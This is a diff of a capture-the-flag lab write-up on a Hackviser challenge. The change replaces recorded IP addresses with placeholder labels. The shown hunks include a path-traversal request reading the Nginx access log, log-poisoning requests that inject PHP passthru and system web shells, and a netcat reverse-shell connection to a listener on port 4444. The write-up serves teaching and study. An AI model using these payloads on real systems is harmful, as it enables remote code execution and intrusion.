@@ -18,22 +18,25 @@ This lab documents a chain of weaknesses and techniques observed in the Hackvise
 
 The notes below distinguish **Source** and **Target** instead of using ambiguous labels such as attacker/victim.
 
-## 2. Source and Target Address Reference
+## 2. Source and Target Naming Convention
 
-| Role | Address observed in the transcript | Description |
-|---|---|---|
-| **Source** | `10.8.69.24` | Kali Linux machine used to send requests and receive the reverse connection. |
-| **Target** | `172.20.4.175` | Hackviser web application server contacted during the main exploitation sequence. |
-| **Target / earlier observed address** | `172.20.8.177` | Address shown in an earlier raw HTTP request. The transcript does not establish whether it represents the same interface or an earlier lab state. |
-| **Address observed in access-log entries** | `172.20.4.110` | Address recorded in earlier Nginx access-log entries. Its exact role is not conclusively established by the transcript. |
+All IP addresses have been replaced with role-based labels to keep the write-up focused on the exploitation workflow and avoid publishing lab network details.
 
-**Important:** These addresses are reproduced from the lab transcript. Do not assume that every address belongs to the same interface or that the network topology is fully known. In the reverse-shell confirmation, the connection explicitly appears as:
+| Label | Meaning |
+|---|---|
+| **`<SOURCE>`** | Kali Linux machine used to send requests and receive the reverse connection. |
+| **`<TARGET>`** | Hackviser web application server contacted during the main exploitation sequence. |
+| **`<LOG-RECORDED CLIENT>`** | A separate client address appearing in earlier Nginx access-log entries. Its exact role is not established by the transcript. |
+
+The original transcript contains more than one address in requests and log entries. This document does not expose those values or assume that every recorded address represents the same host or interface.
+
+In the reverse-shell confirmation, the connection is represented as:
 
 ```text
-connect to [10.8.69.24] from (UNKNOWN) [172.20.4.175] 33184
+connect to [<SOURCE>] from (UNKNOWN) [<TARGET>] 33184
 ```
 
-This identifies `10.8.69.24` as the Source listener address and `172.20.4.175` as the Target that initiated the reverse connection. `33184` is the Target's temporary source port for that connection.
+Here, `<SOURCE>` is the listener machine and `<TARGET>` initiated the reverse connection. `33184` is the Target's temporary source port for that connection; it is a port number, not an IP address.
 
 ## 3. Initial Discovery: Vulnerable PHP Code
 
@@ -65,7 +68,7 @@ The path used in the transcript was:
 The request was sent to the Target:
 
 ```bash
-curl -s "http://172.20.4.175/show-invoice.php?invoice=../../../../var/log/nginx/access.log"
+curl -s "http://<TARGET>/show-invoice.php?invoice=../../../../var/log/nginx/access.log"
 ```
 
 ### Concepts
@@ -90,7 +93,7 @@ An example shown in the transcript was:
 
 ```http
 GET /<?php passthru('id'); ?> HTTP/1.1
-Host: 172.20.8.177
+Host: <TARGET>
 Connection: close
 ```
 
@@ -98,7 +101,7 @@ A later request used:
 
 ```http
 GET /<?php system($_GET['c']); ?> HTTP/1.1
-Host: 172.20.4.175
+Host: <TARGET>
 Connection: close
 ```
 
@@ -145,16 +148,16 @@ listening on [any] 4444 ...
 The reverse connection then arrived:
 
 ```text
-connect to [10.8.69.24] from (UNKNOWN) [172.20.4.175] 33184
+connect to [<SOURCE>] from (UNKNOWN) [<TARGET>] 33184
 ```
 
 ### Understanding the connection
 
 | Item | Meaning |
 |---|---|
-| Source listener IP | `10.8.69.24` |
+| Source listener IP | `<SOURCE>` |
 | Source listener port | `4444` |
-| Target IP | `172.20.4.175` |
+| Target IP | `<TARGET>` |
 | Target temporary source port | `33184` |
 | Tool | Netcat (`nc`) |
 
@@ -196,14 +199,14 @@ In this lab, the Source listened on port `4444`, and the Target initiated the co
 The transcript also shows Netcat being used to connect to the Target's HTTP service:
 
 ```bash
-nc 172.20.4.175 80
+nc <TARGET> 80
 ```
 
 A manual HTTP request was then entered:
 
 ```http
 GET / HTTP/1.1
-Host: 172.20.4.175
+Host: <TARGET>
 Connection: close
 
 ```
@@ -295,7 +298,7 @@ Interpret status codes together with the request, response body, and other evide
 
 ## 14. Lab Conclusion
 
-The transcript documents a successful progression from a PHP file-inclusion weakness to command execution and a reverse-shell connection. The strongest evidence is the `id` output showing `www-data`, followed by the Netcat connection from the Target address `172.20.4.175` to the Source listener at `10.8.69.24:4444`.
+The transcript documents a successful progression from a PHP file-inclusion weakness to command execution and a reverse-shell connection. The strongest evidence is the `id` output showing `www-data`, followed by the Netcat connection from the Target address `<TARGET>` to the Source listener at `<SOURCE>:4444`.
 
 The resulting shell provided access as the web-server account. The transcript does not demonstrate root access or a completed privilege-escalation step.
 
